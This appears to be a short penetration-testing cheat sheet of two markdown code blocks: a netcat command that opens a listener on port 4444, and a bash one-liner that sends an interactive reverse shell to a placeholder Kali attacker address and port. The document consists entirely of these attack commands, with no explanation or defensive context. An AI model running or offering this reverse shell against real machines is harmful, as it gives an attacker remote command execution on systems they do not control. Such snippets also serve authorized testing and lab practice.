### Start a listener
```
nc -nvlp 4444
```

### Reverse Shell
```
bash -i >& /dev/tcp/<kali_ip>/<port> 0>&1
```